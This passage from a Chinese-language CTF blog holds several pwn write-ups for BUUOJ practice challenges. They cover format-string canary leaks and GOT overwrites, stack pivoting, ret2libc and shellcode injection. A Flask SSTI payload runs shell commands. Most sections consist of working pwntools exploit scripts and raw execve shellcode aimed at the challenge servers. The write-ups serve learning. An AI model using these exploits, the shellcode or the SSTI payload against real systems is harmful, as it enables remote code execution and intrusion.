[rbp-8h]  v5 = __readfsqword(0x28u);  read(0, &buf, 0x38uLL);  printf(&buf, &buf);  return 0;}</code></pre><p>很明显程序只提供了一次输入的机会，这里先不讲如何做，下面的方法也不是做这道题的方法，只是举个例子，</p><p>可以看出来，程序存在溢出以及格式化字符串漏洞，我们在这里假设一种情况，这个程序可以循环输入</p><p>这个时候我们就有一个利用思路：</p><p>1.通过格式化字符串泄露Canary</p><p>2.通过溢出来执行后门函数</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level='debug'# io=process("./r2t4")io=remote("node3.buuoj.cn",26701)libc=ELF("./libc-2.29.so")elf=ELF("./r2t4")main=elf.symbols['main']printf=libc.symbols['printf']printf_got=elf.got['printf']system=0x400626payload1='%11$p'io.sendline(payload1)p.recvuntil('0x')canary=int(p.recv(16),16)print hex(canary)payload='a'*0x28+p64(canary)+'a'*8+p64(system)io.sendline(payload)io.interactive()</code></pre><p>当然，exp是跑不通的，我们主要讲如何泄露Canary</p><p>可以看到在我们的exp中，<code>payload1="%11$p"</code></p><blockquote><p>这个11是怎么来的呢？</p></blockquote><p>通过格式化字符串我们算出来的偏移是 <code>6</code></p><p>而buf距离EBP的距离是0x30,0x30-0x8=0x28 是距离Canary的距离，因为是64位，以8 个字节为一个单位</p><p>0x28/8=5 ==&gt;因此偏移为5+6=11，再详细就要自己取查看printf函数原型与64位程序的传参规律了</p><p>关于这种类型的题其实也还有一个更好的例子：<a href="https://blog.csdn.net/qq_38783875/article/details/86319184" target="_blank" rel="noopener">https://blog.csdn.net/qq_38783875/article/details/86319184</a></p><p>这里不多描述了</p><h2 id="0x40-利用Canary"><a href="#0x40-利用Canary" class="headerlink" title="0x40 利用Canary"></a>0x40 利用Canary</h2><p>还是那道题</p><p>我们没法绕过canary，也就是说我们必须从格式化字符串那里入手</p><p>通过脚本，工具，或者peda里的fmtarg，我们可以算出偏移量为 <code>6</code></p><p>程序开启了canary，而canary会触发栈检查，因此我们如果将栈检查的地址覆盖为程序所给出的后门地址（我试过改成main函数地址，但好像并不能实现无限循环）,然后故意触发Canary，不就getshell了</p><p>1574 转化为十六进制为 0x626，也就是 backdoor 函数的后 12 bit，只需要覆盖这么多即可，$hn 后面的五个 a 是为了对齐 8 字节内存空间用的。总之这里的偏移需要自己在 gdb 中进行调试才可以确定下面</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level='debug'# io=process("./r2t4")io=remote("node3.buuoj.cn",27328)elf=ELF("./r2t4")system=0x400626# .got.plt:0000000000601018 off_601018      dq offset __stack_chk_failstack_ck=0x0000000000601018# fmtstr_payload(6,{stack_ck:system})# payload1='a'*(0x30-0x8-len(fmtstr_payload(6,{stack_ck:system}))) # payload1=fmtstr_payload(6,{stack_ck:system})payload1="%1574c%8$hnaaaaa"+p64(stack_ck)payload1=payload1.ljust(0x30,"a")io.sendline(payload1)log.info("length of payload: " + str(len(payload1)))io.interactive()</code></pre><p>剩下的等以后见到了在补充，，格式化字符串的精髓还是用好 <code>%n</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移学习记录</title>
      <link href="/2020/03/25/ctf/pwn/qianyi/"/>
      <url>/2020/03/25/ctf/pwn/qianyi/</url>
      
        <content type="html"><![CDATA[<h2 id="栈迁移学习记录"><a href="#栈迁移学习记录" class="headerlink" title="栈迁移学习记录"></a>栈迁移学习记录</h2><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本篇只做学习记录整理所用</p><p>本篇参考了：<a href="https://bbs.pediy.com/thread-258030.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-258030.htm</a></p><h2 id="0x10-栈迁移原理"><a href="#0x10-栈迁移原理" class="headerlink" title="0x10 栈迁移原理"></a>0x10 栈迁移原理</h2><p>主要看大佬的那篇图示就行了</p><h2 id="0x20-example"><a href="#0x20-example" class="headerlink" title="0x20 example"></a>0x20 example</h2><p>[Black Watch 入群题]PWN</p><p>题目来源：buuoj</p><p>考点：栈迁移</p><p>难度：简单</p><p>32位动态链接库文件</p><p>开启NX保护</p><p>ida反汇编分析</p><pre class=" language-lang-c"><code class="language-lang-c">ssize_t vul_function(){  size_t v0; // eax  size_t v1; // eax  char buf; // [esp+0h] [ebp-18h]  v0 = strlen(m1);  write(1, m1, v0);  read(0, &s, 0x200u); //写入bss段  v1 = strlen(m2);  write(1, m2, v1);  return read(0, &buf, 0x20u); //存在溢出}</code></pre><p>bss段权限：</p><pre><code>0x0804a000 0x0804b000 rw-p</code></pre><p>程序的主要函数也就这一个，可以明显的看到read处存在溢出，但只有0x20-0x18-0x4=0x4个字节的溢出，这这明显不够啊,根据栈迁移的原理，我们可以整理出这样的利用思路：</p><p>1.利用 <code>leave;ret</code>指令将栈迁移到bss段上，其实也就是修改程序返回流程到bss段</p><p>2.在bss段上放上我们的payload</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#!usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *context.log_level='debug'p=process('./spwn')# p=remote('node3.buuoj.cn',26044)elf=ELF('./spwn')# s_addr bss_s=0x0804A300# 0x08048408 : leave ; retleave_ret=0x08048408 write_plt=elf.plt['write'] #write的plt表可以调用write函数write_got=elf.got['write'] #write的got表里面有write函数的真实地址main_addr=elf.symbols['main']p.recvuntil("name?")payload=p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)#栈迁移过来后 执行write函数 write后返回main函数 write的三个参数# write(1,write.got,4) + retaddrp.send(payload)p.recvuntil("say?")payload='a'*0x18+p32(bss_s-4)+p32(leave_ret)#ebp bss_s#覆盖量 因为由于有pop ebp，会使esp-4，将ebp 覆盖为想要调整的位置-4#leave_ret相当于先mov esp，ebp 然后pop ebp，再pop eip#mov esp ebp -->esp bss_s#pop ebp     -->#pop eip#这样执行，esp指向ebp，也就是上面栈指向bss-4的位置，然后，pop ebp，esp、ebp指向bss，pop eip，然后程序就来执行了write函数，esp指向了main_addr，执行完write就main回去了p.send(payload)leak=u32(p.recv(4))libc=LibcSearcher('write',leak)libc_base=leak-libc.dump('write')system_addr=libc_base + libc.dump('system')#***第二次执行程序***p.recv()payload=p32(system_addr)+p32(main_addr)+p32(bss_s+4*3)+ '/bin/sh\x00'#这次在bss段构造 system函数  返回地址       参数在bss_s后面三个位置   在这个位置填上system的参数p.send(payload)p.recv()payload='a'*0x18+p32(bss_s-4)+p32(leave_ret)p.send(payload)p.interactive()</code></pre><h2 id="0x100-参考连接"><a href="#0x100-参考连接" class="headerlink" title="0x100 参考连接"></a>0x100 参考连接</h2><p><a href="https://bbs.pediy.com/thread-258030.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-258030.htm</a> 栈迁移原理</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-Day12</title>
      <link href="/2020/03/25/ctf/pwn/day12/"/>
      <url>/2020/03/25/ctf/pwn/day12/</url>
      
        <content type="html"><![CDATA[<h2 id="0x10-Black-Watch-入群题-PWN"><a href="#0x10-Black-Watch-入群题-PWN" class="headerlink" title="0x10 [Black Watch 入群题]PWN"></a>0x10 [Black Watch 入群题]PWN</h2><p>题目来源：buuoj</p><p>考点：栈迁移</p><p>难度：简单</p><p>32位动态链接库文件</p><p>开启NX保护</p><p>ida反汇编分析</p><pre class=" language-lang-c"><code class="language-lang-c">ssize_t vul_function(){  size_t v0; // eax  size_t v1; // eax  char buf; // [esp+0h] [ebp-18h]  v0 = strlen(m1);  write(1, m1, v0);  read(0, &s, 0x200u);  v1 = strlen(m2);  write(1, m2, v1);  return read(0, &buf, 0x20u); //存在溢出}</code></pre><p>程序的主要函数也就这一个，可以明显的看到read处存在溢出，但只有0x20-0x18-0x4=0x4个字节的溢出，这这明显不够啊，详细移步另一篇博客</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#!usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *context.log_level='debug'p=process('./spwn')# p=remote('node3.buuoj.cn',26044)elf=ELF('./spwn')# s_addr bss_s=0x0804A300# 0x08048408 : leave ; retleave_ret=0x08048408 write_plt=elf.plt['write'] #write的plt表可以调用write函数write_got=elf.got['write'] #write的got表里面有write函数的真实地址main_addr=elf.symbols['main']p.recvuntil("name?")payload=p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)#栈迁移过来后 执行write函数 write后返回main函数 write的三个参数# write(1,write.got,4) + retaddrp.send(payload)p.recvuntil("say?")payload='a'*0x18+p32(bss_s-4)+p32(leave_ret)#ebp bss_s#覆盖量 因为由于有pop ebp，会使esp-4，将ebp 覆盖为想要调整的位置-4#leave_ret相当于先mov esp，ebp 然后pop ebp，再pop eip#mov esp ebp -->esp bss_s#pop ebp     -->#pop eip#这样执行，esp指向ebp，也就是上面栈指向bss-4的位置，然后，pop ebp，esp、ebp指向bss，pop eip，然后程序就来执行了write函数，esp指向了main_addr，执行完write就main回去了p.send(payload)leak=u32(p.recv(4))libc=LibcSearcher('write',leak)libc_base=leak-libc.dump('write')system_addr=libc_base + libc.dump('system')#***第二次执行程序***p.recv()payload=p32(system_addr)+p32(main_addr)+p32(bss_s+4*3)+ '/bin/sh\x00'#这次在bss段构造 system函数  返回地址       参数在bss_s后面三个位置   在这个位置填上system的参数p.send(payload)p.recv()payload='a'*0x18+p32(bss_s-4)+p32(leave_ret)p.send(payload)p.interactive()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-day11</title>
      <link href="/2020/03/25/ctf/pwn/day11/"/>
      <url>/2020/03/25/ctf/pwn/day11/</url>
      
        <content type="html"><![CDATA[<h1 id="Day11"><a href="#Day11" class="headerlink" title="Day11"></a>Day11</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>复现、复现、复现</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200315151450.png" alt=""></p><h2 id="0x10-secret"><a href="#0x10-secret" class="headerlink" title="0x10 secret"></a>0x10 secret</h2><p>题目来源：buuoj BJDCTF</p><p>考点：缓冲区溢出、GOT表覆写 出题人说的</p><p>难度：一般</p><p>64位动态链接库文件，开启NX，Canary保护</p><p>ida反汇编分析</p><pre class=" language-lang-python"><code class="language-lang-python">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  rungame();  if ( guess(a1, a2) )    gameover();  system("cat /flag");  return 0LL;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">unsigned __int64 rungame(){  unsigned int i; // [rsp+Ch] [rbp-54h]  char s; // [rsp+10h] [rbp-50h]  unsigned __int64 v3; // [rsp+58h] [rbp-8h]  v3 = __readfsqword(0x28u);  *off_46D090 = 10000;  for ( i = 0; i <= 9; ++i )    buf[i] = 0;  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  puts("@====================================@");  sub_4011C2("# What's your name? ________________ #", 20);  buf[(read(0, buf, 0x16uLL) - 1)] = 0;  sprintf(&s, "#      Welcome %-16s      #", buf);  puts(&s);  puts("#====================================#");  puts("#    I have toooooo many secrets >   #");  puts("#        Can u find them _<          #");  puts("#====================================#");  return __readfsqword(0x28u) ^ v3;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">unsigned __int64 secret(){  char buf; // [rsp+0h] [rbp-20h]  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  sub_4011C2("#           Secret: _____            #", 20);  read(0, &buf, 0xAuLL);  dword_46D0BC = atoi(&buf);  --*off_46D090;  return __readfsqword(0x28u) ^ v2;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">void __noreturn gameover(){  puts("#====================================#");  puts("#             GAME OVER              #");  puts("#====================================#");  sub_4011C2("#        BYE BYE~                    #", 18);  printf(buf, 18LL);  puts(&byte_46B0A7);  puts("@====================================@");  exit(0);}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">unsigned __int64 towin(){  char s; // [rsp+0h] [rbp-50h]  unsigned __int64 v2; // [rsp+48h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts("#====================================#");  sprintf(&s, "#  GOOD JOB GUESS %4d TIMES TO WIN  #", *off_46D090);  puts(&s);  puts("#====================================#");  return __readfsqword(0x28u) ^ v2;}</code></pre><p>1.出题人解法：</p><pre class=" language-lang-txt"><code class="language-lang-txt">data:000000000046D080 ; char buf[].data:000000000046D080 buf             db 'Y0ur_N@me',0        .data:000000000046D080                                         .data:000000000046D08A                 align 10h.data:000000000046D090 times           dq offset unk_46D0C0    .data:000000000046D090                                         .data:000000000046D090 _data           ends</code></pre><p>程序开头read(0, buf, 0x16)，实际上buf大小只有0x10，后6字节会覆盖times变量</p><pre class=" language-lang-c"><code class="language-lang-c">void __noreturn sub_401301(){  puts("#====================================#");  puts("#             GAME OVER              #");  puts("#====================================#");  sub_4011C2("#        BYE BYE~                    #", 18LL);  printf(buf, 18LL);  puts(&byte_46B0A7);  puts("@====================================@");  exit(0);}</code></pre><p>猜错退出程序时，有个printf打印buf内容，查看got表，发现printf和system只差0x10</p><pre><code>[0x46d038] system@GLIBC_2.2.5 -&gt; 0x401076 (system@plt+6) ◂— push   4[0x46d040] printf@GLIBC_2.2.5 -&gt; 0x401086 (printf@plt+6) ◂— push   5</code></pre><p>所以把times覆盖成got[printf]</p><pre class=" language-lang-txt"><code class="language-lang-txt">buf='/bin/sh;' ; got[printf] -> system</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python# -*- coding: utf-8 -*from pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'amd64'elf = ELF('./secret')p = 0def send_secret(secret):    p.sendlineafter("Secret: ",str(secret))def pwn(ip,port,debug):    global p    if(debug == 1):        p = process('./secret')    else:        p = remote(ip,port)# .got.plt:000000000046D040 off_46D040      dq offset printf        ; DATA XREF: _printf↑r    p.recvuntil("your name? ")    p.sendline('/bin/sh;AAAAAAAA'+p32(0x46d040))    secret = [18283,11576,17728,15991,12642,16253,13690,15605,12190,16874,18648,10083,18252,14345,11875]    for i in secret:        send_secret(i)    send_secret(66666)    p.interactive()if __name__ == '__main__':    pwn('buuoj.cn',25493,0)</code></pre><p>2.找出10000个secret</p><pre class=" language-lang-txt"><code class="language-lang-txt">.text:000000000040136D sub_40136D      proc near               ; CODE XREF: main+13↓p.text:000000000040136D ; __unwind {.text:000000000040136D                 push    rbp.text:000000000040136E                 mov     rbp, rsp.text:0000000000401371                 mov     eax, 0.text:0000000000401376                 call    sub_46A329.text:000000000040137B                 mov     eax, cs:dword_46D0BC.text:0000000000401381                 cmp     eax, 476Bh //secret.text:0000000000401386                 jz      short loc_401392.text:0000000000401388                 mov     eax, 0FFFFFFFFh.text:000000000040138D                 jmp     loc_46A327.text:0000000000401392 ; ---------------------------------------------------------------------------.text:0000000000401392.text:0000000000401392 loc_401392:                             ; CODE XREF: sub_40136D+19↑j.text:0000000000401392                 mov     eax, 0.text:0000000000401397                 call    sub_40128E.text:000000000040139C                 mov     eax, 0.text:00000000004013A1                 call    sub_46A329.text:00000000004013A6                 mov     eax, cs:dword_46D0BC.text:00000000004013AC                 cmp     eax, 2D38h //secret.text:00000000004013B1                 jz      short loc_4013BD.text:00000000004013B3                 mov     eax, 0FFFFFFFFh.text:00000000004013B8                 jmp     loc_46A327.text:00000000004013BD ; ---------------------------------------------------------------------------</code></pre><pre class=" language-lang-python"><code class="language-lang-python">import refile=open("secret.asm",'r')file2=open("jieguo.txt",'w')data=file.readlines()for i in range(len(data)):    if re.search('cmp     eax, ',data[i]):        file2.write(data[i][29:33]+'\n')print "yes"</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python"># -*- coding: utf-8 -*from pwn import *from LibcSearcher import *#context.log_level = 'debug'context.arch = 'amd64'elf = ELF('secret')p = 0def pwn(ip,port,debug):    global p    if(debug == 1):        p = process('./secret')    else:        p = remote(ip,port)    #gdb.attach(p)    file=open("jieguo.txt","r")    data=file.readlines()    p.sendafter("your name? ","a"*0x10)    for i in range(len(data)):        p.sendlineafter("Secret: ",str(int(data[i],16)))        print "===>",i,"/10000"    p.sendlineafter("Secret: ","0")    p.interactive()if __name__ == '__main__':    pwn('buuoj.cn',25338,0)</code></pre><p>大佬写的脚本，拿来直接一跑没什么问题就没改，不过确实，得跑的时间不短，还有可能出问题</p><h2 id="0x20-diff"><a href="#0x20-diff" class="headerlink" title="0x20 diff"></a>0x20 diff</h2><p>看了wp才知道，真就是栈溢出入门题</p><p>题目考点：栈溢出、linux基础</p><p>题目难度：入门</p><p>32位动态链接库文件，没开任何保护</p><p>漏洞函数</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl compare(int a1, int fd){  char v2; // al  int v4; // [esp+0h] [ebp-80h]  unsigned int i; // [esp+4h] [ebp-7Ch]  char addr[120]; // [esp+8h] [ebp-78h]  v4 = 0;  JUMPOUT(sys_read(fd, buf1, 0x80u), 0, &failed);  JUMPOUT(sys_read(a1, addr, 0x80u), 0, &failed);  for ( i = 0; addr[i] + buf1[i] && i < 0x400; ++i )  {    v2 = buf1[i];    if ( v2 != addr[i] )      return v4 + 1;    if ( v2 == 10 )      ++v4;  }  return 0;}</code></pre><p>由于没开任何保护，所以这道题有两种做法</p><p>1.利用 <code>sys_write(1, v1 + 1, len);</code></p><pre class=" language-lang-txt"><code class="language-lang-txt">  sys_write(1, v1 + 1, len);对应汇编.text:0804915E                 mov     eax, 4.text:08049163                 mov     ebx, 1          ; fd.text:08049168                 mov     ecx, esi.text:0804916A                 add     ecx, 1          ; addr.text:0804916D                 mov     edx, [ebp+len]  ; len.text:08049170                 int     80h             ; LINUX - sys_write.text:08049172                 leave</code></pre><p>同时在动调中发现compare当执行retn时，esi寄存器刚好等于flag的地址，构造 <code>payload: python -c "print 'a'*120 +'\x5e\x91\x04\x08'*2" &gt;flag2</code> </p><p>我不知道的是 <code>/tmp</code> 目录下可以写东西，，，</p><p>2.shellcode</p><p>由于 <code>buf1</code> 具有可执行权限</p><pre class=" language-lang-txt"><code class="language-lang-txt">pwndbg> p &buf1$2 = (<data variable, no debug info> *) 0x804a024 <buf1>pwndbg> vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x8048000  0x804a000 r-xp     2000 0      /xxx/diff 0x804a000  0x804b000 rwxp     1000 2000   /xxx/diff0xf7ffa000 0xf7ffd000 r--p     3000 0      [vvar]0xf7ffd000 0xf7ffe000 r-xp     1000 0      [vdso]0xfffdc000 0xffffe000 rwxp    22000 0      [stack]</code></pre><p>因此，在第一个文件中存shellcode，在第二个文件中存payload，将返回地址覆盖为buf1地址，即可getshell</p><pre class=" language-lang-txt"><code class="language-lang-txt">.bss:0804A024 buf1            db 400h dup(?)          ; DATA XREF: compare+18↑o</code></pre><p>payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">python -c "print 'a'*124 +'\x24\xa0\x04\x08'" > payloadpython -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' " >shellcode</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-day08</title>
      <link href="/2020/03/24/ctf/pwn/day08/"/>
      <url>/2020/03/24/ctf/pwn/day08/</url>
      
        <content type="html"><![CDATA[<h1 id="Day08"><a href="#Day08" class="headerlink" title="Day08"></a>Day08</h1><h2 id="0x10-HarekazeCTF2019-baby-rop2"><a href="#0x10-HarekazeCTF2019-baby-rop2" class="headerlink" title="0x10 [HarekazeCTF2019]baby_rop2"></a>0x10 [HarekazeCTF2019]baby_rop2</h2><p>题目来源 : buuoj.cn</p><p>题目难度：简单</p><p>考点：read()溢出，ret2libc, ropgadget</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *# context.log_level = "debug"elf=ELF("./babyrop2")# fo=process("./babyrop2")fo=remote("node3.buuoj.cn",27924)printf=elf.plt['printf']main=elf.symbols['main']libc_start_main=elf.got['__libc_start_main']# 0x0000000000400733 : pop rdi ; ret# 0x0000000000400731 : pop rsi ; pop r15 ; ret# 0x0000000000400790 : %spop2=0x0000000000400731pop_rdi=0x0000000000400733formats=0x0000000000400790#payload='a'*offset + pop_rdi +  %s+  pop2 + libc_start_main + printf + ret_main  # rdi, rsi, rdx, rcx, r8, r9# pop rdi %s# pop rsi libc_start_main# pop r15 随意# 按照传参顺序，需要填充r15payload1= 'a'* 40 + p64(pop_rdi) + p64(formats)+ p64(pop2) + p64(libc_start_main) + p64(8)payload1+=p64(printf)+ p64(main)fo.sendlineafter("What's your name? ",payload1)libc_start_main_addr = u64(fo.recvuntil('\x7f')[-6:].ljust(8,'\x00'))log.info("libc_start_main_addr:" + hex(libc_start_main_addr))libc=LibcSearcher("__libc_start_main",libc_start_main_addr)libc_base=libc_start_main_addr-libc.dump("__libc_start_main")sys_addr = libc_base + libc.dump("system")bin_addr =  libc_base + libc.dump("str_bin_sh") # payload2 = 'a'*offset + pop_rdi + binsh + system +retaddrpayload2= 'a' * 40 + p64(pop_rdi) + p64(bin_addr) +p64(sys_addr) + '0000'fo.sendlineafter("What's your name? ",payload2)fo.sendline("cat /home/babyrop2/flag")fo.interactive()</code></pre><h2 id="0x20-ciscn-2019-ne-5"><a href="#0x20-ciscn-2019-ne-5" class="headerlink" title="0x20 ciscn_2019_ne_5"></a>0x20 ciscn_2019_ne_5</h2><p>题目来源:buuoj</p><p>考点：没有/bin/sh 可以使用sh,或者 <code>$0</code></p><p>难度：简单</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python #-*-coding:utf-8-*-from pwn import *# context.log_level="debug"def choose(index):    global fo    fo.recvuntil("Input your operation:\n")    fo.sendline(str(index))proc="./ciscn_2019_ne_5"#fo=process(proc)fo=remote("node3.buuoj.cn",26522)elf=ELF(proc)main=elf.symbols['main']system=elf.symbols['system']log.info("main:"+hex(main))log.info("system:"+hex(system))password="administrator\x00"# 0x080482ea : shsh_addr= 0x080482ea# payload='a'*offset + system + retaddr + commedpayload1='a'*76 + p32(system) +'bbbb' + p32(sh_addr)fo.sendlineafter("Please input admin password:",password)choose(1)fo.sendline(payload1)choose(4)fo.sendline("cat flag")fo.interactive()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF 2nd 个人wp</title>
      <link href="/2020/03/23/ctf/pwn/bjdctf/"/>
      <url>/2020/03/23/ctf/pwn/bjdctf/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF-2nd-wp"><a href="#BJDCTF-2nd-wp" class="headerlink" title="BJDCTF 2nd wp"></a>BJDCTF 2nd wp</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>周末没事玩一下，冲冲冲,玩下pwn,顺手看下好久没看过的web, 其实招新赛嘛，很多题都是网上魔改过来的，个别难的一批的例外</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200315151450.png" alt=""></p><h2 id="0x10-fask-google"><a href="#0x10-fask-google" class="headerlink" title="0x10 fask google"></a>0x10 fask google</h2><p>现在web水平都太高了，php都很少见了，都是flask，Django,spring这些主流的web框架了</p><p>考点：flask ssti</p><p>题目难度：入门</p><p>payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[%27__builtins__%27][%27eval%27](%27__import__("os").popen("cat%20/flag").read()%27)}}</code></pre><p>下面几道xss,盲注啥的不会绕了，，，老老实实去玩pwn吧,一共11道pwn,我做出来7道，secret没找到利用思路，其他的几道根本就看不懂</p><h2 id="0x20-one-gadget"><a href="#0x20-one-gadget" class="headerlink" title="0x20 one_gadget"></a>0x20 one_gadget</h2><p>考点: one_gadget</p><p>难度：简单</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *libc=ELF("./libc-2.29.so")libc_printf=libc.symbols['printf']context.log_level='debug'io=process("./one_gadget")# io=remote("node3.buuoj.cn",27075)io.recvuntil("here is the gift for u:")printf=io.recvline('\x30')[0:14].ljust(8,"\x00")print "printf:",printfprint "printf_libc:",hex(libc_printf)libc_base= int(printf,16) - libc_printfone_gadget=0x106ef8system=one_gadget+libc_baseprint "system:",system io.recvuntil("Give me your one gadget:")#io.sendline(system)io.interactive()</code></pre><h2 id="0x30-r2t3"><a href="#0x30-r2t3" class="headerlink" title="0x30 r2t3"></a>0x30 r2t3</h2><p>考点：整形溢出</p><p>难度：入门</p><p>参考：<a href="https://www.anquanke.com/post/id/173063#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/173063#h2-4</a> </p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level='debug'io=remote("node3.buuoj.cn",28007)# io=process("./r2t3")system_addr=0x0804858Bpayload='a'# 0x15=0x11+0x4payload=payload.ljust(0x15,'a') + p32(system_addr)io.recvuntil("[+]Please input your name:\n")# 4 <name< 8#260=0x104 # strlen 比较时取-->0x04,符合长度io.sendline(payload.ljust(260,'a'))io.sendline("cat flag")io.interactive()</code></pre><h2 id="0x40-r2t4"><a href="#0x40-r2t4" class="headerlink" title="0x40 r2t4"></a>0x40 r2t4</h2><p>考点：格式化字符串漏洞</p><p>难度：中等</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level='debug'# io=process("./r2t4")io=remote("node3.buuoj.cn",27328)elf=ELF("./r2t4")system=0x400626# .got.plt:0000000000601018 off_601018      dq offset __stack_chk_failstack_ck=0x0000000000601018# fmtstr_payload(6,{stack_ck:system})# payload1='a'*(0x30-0x8-len(fmtstr_payload(6,{stack_ck:system}))) # payload1=fmtstr_payload(6,{stack_ck:system})payload1="%1574c%8$hnaaaaa"+p64(stack_ck)payload1=payload1.ljust(0x30,"a")io.sendline(payload1)log.info("length of payload: " + str(len(payload1)))io.interactive()</code></pre><p>这道题的利用思路很有趣，程序只提供了一次输入的机会，虽然存在栈溢出漏洞，但也开启了canary保护。</p><p>因此我们没法绕过canary，也就是说我们必须从格式化字符串那里入手</p><p>通过脚本，工具，或者peda里的fmtarg，我们可以算出偏移量为 <code>6</code> </p><p>程序开启了canary，而canary会触发栈检查，因此我们如果将栈检查的地址覆盖为程序所给出的后门地址（我试过改成main函数地址，但好像并不能实现无限循环）</p><p>1574 转化为十六进制为 0x626，也就是 backdoor 函数的后 12 bit，只需要覆盖这么多即可，$hn 后面的五个 a 是为了对齐 8 字节内存空间用的。总之这里的偏移需要自己在 gdb 中进行调试才可以确定下面</p><p>具体可以参考：<a href="https://www.anquanke.com/post/id/180009#h2-9" target="_blank" 